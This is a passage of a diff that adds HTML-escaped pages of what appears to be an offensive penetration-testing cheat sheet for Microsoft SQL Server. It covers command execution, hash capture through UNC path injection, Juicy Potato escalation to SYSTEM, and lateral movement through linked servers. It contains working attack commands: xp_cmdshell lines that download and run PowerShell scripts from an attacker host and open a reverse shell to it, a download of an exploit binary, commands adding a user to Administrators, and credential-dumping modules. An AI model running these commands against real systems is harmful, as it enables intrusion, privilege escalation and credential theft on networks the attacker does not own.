+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmdR&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;powershell -e &amp;lt;base64encodedscript&amp;gt;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLOSCmdPython&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;sa&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password1&amp;#34;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;powershell -e &amp;lt;base64encodedscript&amp;gt;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reference:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5" target="_blank" rel="noopener">https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server" target="_blank" rel="noopener">https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h3 id="public-to-os-service-account">Public to OS Service Account&lt;/h3>
+&lt;h4 id="public-to-os-service-account---unc-path-injection">Public to OS Service Account - UNC Path Injection&lt;/h4>
+&lt;p>A very well known method to capture Net-NTLM (also known as NTLMv1/v2) hashes. Stored procedures like &lt;strong>xp_dirtree&lt;/strong> and &lt;strong>xp_fileexist&lt;/strong> can be used to capture Net-NTLM hashes. The captured hashes can be cracked using John-the-Ripper, Hashcat etc&lt;/p>
+&lt;p>PowerUpSQL automates this impressively (uses Inveigh &lt;a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Inveigh&lt;/a> as a capture server):&lt;/p>
+&lt;ol>
+&lt;li>Gets SQL Server SPNs&lt;/li>
+&lt;li>Attempt to log into each&lt;/li>
+&lt;li>Performs UNC path injection&lt;/li>
+&lt;li>Capture password hashes&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLUncPathInjection&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-CaptureIp&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ATTACKER_IP&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>More in UNC Path Injection cheatsheet: &lt;a href="https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e" target="_blank" rel="noopener">https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e&lt;/a>&lt;/p>
+&lt;p>If the process cannot be automatized, it is necessary first to start on a machine:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Inveigh&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">Inveigh&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Inveigh&lt;/span> &lt;span class="n">-FileOutput&lt;/span> &lt;span class="n">Y&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>then on HeidiSQL connect to the database and execute one of the following queries by replacing the correct attacker IP:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_dirtree&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;\\attackerip\file&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_fileexist&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;\\attackerip\file&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="os-service-account-to-local-system">OS Service Account to Local SYSTEM&lt;/h3>
+&lt;h4 id="os-service-account-to-local-system---rotten-potato">OS Service Account to Local SYSTEM - Rotten Potato&lt;/h4>
+&lt;p>Reference: &lt;a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" target="_blank" rel="noopener">https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/&lt;/a>&lt;/p>
+&lt;h4 id="os-service-account-to-local-system---juicy-potato">OS Service Account to Local SYSTEM - Juicy Potato&lt;/h4>
+&lt;p>Reference: &lt;a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener">https://github.com/ohpe/juicy-potato&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Listener&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-v&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get command execution&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLinkCrawl&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="n">INSTANCE&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;EXEC master..xp_cmdshell &amp;#39;powershell.exe iex (iwr http://192.168.50.51/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.50.51 -Port 443&amp;#39;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Grab Juicy potato&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">wget &lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">50&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">51&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">juicy-potato&lt;/span>&lt;span class="n">-master&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">JuicyPotato&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">JuicyPotato&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-UseBasicParsing&lt;/span> &lt;span class="n">-Outfile&lt;/span> &lt;span class="n">juicypotato&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">EXEC&lt;/span> &lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="py">xp_cmdshell&lt;/span> &lt;span class="s1">&amp;#39;powershell -ep bypass -c wget &amp;#39;&amp;#39;http://192.168.50.53:8888/JuicyTomato.exe&amp;#39;&amp;#39; -OutFile c:\Users\Public\JuicyTomato.exe&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># own&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">./&lt;/span>&lt;span class="n">juicypotato&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Windows&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">System32&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-a&lt;/span> &lt;span class="s2">&amp;#34;/c net localgroup Administrators DOMAIN\USER /add&amp;#34;&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="mf">8000&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">EXEC&lt;/span> &lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="py">xp_cmdshell&lt;/span> &lt;span class="s1">&amp;#39;powershell -ep bypass -c c:\users\public\JuicyTomato.exe -t * -p c:\Windows\System32\cmd.exe -a &amp;#39;&amp;#39;/c net localgroup Administrators usfun\pastudent53 /add&amp;#39;&amp;#39; -l 8000&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="local-admin-to-sysadmin">Local Admin to Sysadmin&lt;/h3>
+&lt;p>Extract service account credentials from LSA Secrets and/or memory, Token Impersonation for the SQL Server service, single user mode etc. are very well known methods.&lt;/p>
+&lt;p>Impersonating the SQL Server service account (sysadmin) using the PowerUpSQL function InvokeSQLImpersonateService that wraps Joe Bialek’s Invoke-TokenManipulation:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLImpersonateService&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="lateral-movement">Lateral Movement&lt;/h2>
+&lt;p>Once we move to the OS layer by executing OS commands, it is possible to move laterally to spread our access. SQL Servers provide various possibilities for lateral movement:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Shared Service Accounts&lt;/strong> = Domain user or Domain admin (OS layer)&lt;/li>
+&lt;li>&lt;strong>SQL Server Links&lt;/strong> = Move laterally in the database layer&lt;/li>
+&lt;/ul>
+&lt;h3 id="shared-service-accounts">Shared Service Accounts&lt;/h3>
+&lt;p>&lt;strong>Why should I care about SQL Servers that share service accounts?&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>SysAdmins can execute OS commands&lt;/li>
+&lt;li>OS commands run as the SQL Server service account&lt;/li>
+&lt;li>Service accounts have sysadmin privileges by default&lt;/li>
+&lt;li>Companies often use a single domain account to run hundreds of SQL Servers&lt;/li>
+&lt;li>So if you get sysadmin on one server you have it on all of them!&lt;/li>
+&lt;/ul>
+&lt;p>Check if current user has sa privs on a SQL instance:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLServerInfo&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Check for alternate creds:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">runas&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">noprofile&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">netonly&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">domain&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLServerInfo&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Note that if we have access to hashes or tickets of any user, it always pay to check if that user is sysadmin on any database in the domain.&lt;/p>
+&lt;p>A user with public (everyone) role can be used to enumerate domain accounts and groups in the forest and other trusted forests by fuzzing the values to SUSER_NAME function:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLFuzzDomainAccount&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1.cybercorp.local&amp;#34;&lt;/span> &lt;span class="n">-StartId&lt;/span> &lt;span class="mf">500&lt;/span> &lt;span class="n">-EndId&lt;/span> &lt;span class="mf">2000&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLFuzzDomainAccount&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-StartId&lt;/span> &lt;span class="mf">500&lt;/span> &lt;span class="n">-EndId&lt;/span> &lt;span class="mf">2000&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="sql-server-links">SQL Server Links&lt;/h3>
+&lt;p>&lt;strong>What’s a SQL Server Link?&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Database links are basically persistent database connections for SQL Servers.&lt;/li>
+&lt;li>A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources (Access, Excel, Oracle etc.).&lt;/li>
+&lt;li>In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.&lt;/li>
+&lt;li>Database links work across SQL server versions and even across forest trusts.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>Why should I care about SQL Server Links?&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Short answer = privilege escalation&lt;/li>
+&lt;li>Links can be accessed by the public role via openquery&lt;/li>
+&lt;li>Links are often configured with excessive privileges so they can allow you to impersonate logins on remote servers.&lt;/li>
+&lt;li>xp_cmdshell and other command can be ran through&lt;/li>
+&lt;li>Links can be crawled.&lt;/li>
+&lt;/ul>
+&lt;p>SQL Server links can be exploited by:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;code>HeidiSQL&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Look for links to remote servers (public privs are enough)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">sysservers&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Run the same query on linked databases.Openquery() function can be used to run queries on a linked database
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">openquery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;SQLServer2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;select * from master..sysservers&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Openquery queries can be chained to access links within links (nested links)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">openquery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;SQLServer2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;select * from openquery(&amp;#34;SQLServer3&amp;#34;,&amp;#39;&amp;#39;select * from master..sysservers&amp;#39;&amp;#39;)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Hereafter, a long example of openquery
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">openquery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ops-mssql&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;select * from openquery(&amp;#34;opsfile&amp;#34;,&amp;#39;&amp;#39;select * from openquery(&amp;#34;ops-sqlsrvprod&amp;#34;,&amp;#39;&amp;#39;&amp;#39;&amp;#39;select * from openquery(&amp;#34;dps-sqlreport&amp;#34;, &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;select * from openquery(&amp;#34;dps-mssql&amp;#34;,&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;select @@version as version;exec master..xp_cmdshell &amp;#34;powershell whoami&amp;#34;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#39;)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>xp_cmdshell&lt;/code> cannot be enabled on linked databases unless rpcout is enabled for all links (disabled by default), &lt;code>xp_cmdshell&lt;/code> can be enabled using:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- The query travels through the links and executes at the instance specified by AT
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXECUTE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sp_configure &amp;#39;&amp;#39;xp_cmdshell&amp;#39;&amp;#39;,1;reconfigure;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;SQLServer2&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the initial SQL server, OS commands can be executed using nested link queries (&lt;strong>remember to double nested single quotes for escaping&lt;/strong>):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">openquery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;SQLServer2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;select * from openquery(&amp;#34;SQLServer3&amp;#34;,&amp;#39;&amp;#39;select * from openquery(&amp;#34;SQLServer4&amp;#34;,&amp;#39;&amp;#39;&amp;#39;&amp;#39;select @@version as version;exec master..xp_cmdshell &amp;#34;cmd /c calc.exe&amp;#34;&amp;#39;&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#39;)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;code>PowerUpSQL&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Look for links to remote servers (public privs are enough)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLink&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Enumerate database links. PowerUpSQL saves us from managing these pesky quotes: &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLinkCrawl&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Execute the query on each server along the link&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLinkCrawl&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;exec master..xp_cmdshell &amp;#39;cmd /c calc.exe&amp;#39;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLinkCrawl&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;exec master..xp_cmdshell &amp;#39;cmd /c calc.exe&amp;#39;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Instance&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">CustomQuery&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLinkCrawl&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s1">&amp;#39;exec master..xp_cmdshell &amp;#34;powershell iex (New-Object Net.WebClient).DownloadString(&amp;#39;&amp;#39;http://192.168.100.X:8080/InvokePowerShellTcpEx.ps1&amp;#39;&amp;#39;)&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;code>NetSPI Powershell Modules&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Extracting passwords from MSSQL instances&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Get-MSSQLCredentialPasswords&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psm1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-MSSQLCredentialPasswords&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Extracting passwords from database links&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Get-MSSQLLinkPasswords&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psm1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-MSSQLLinkPasswords&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Extracting all MSSQL passwords&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Get-MSSQLAllCredentials&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psm1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-MSSQLAllCredentials&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
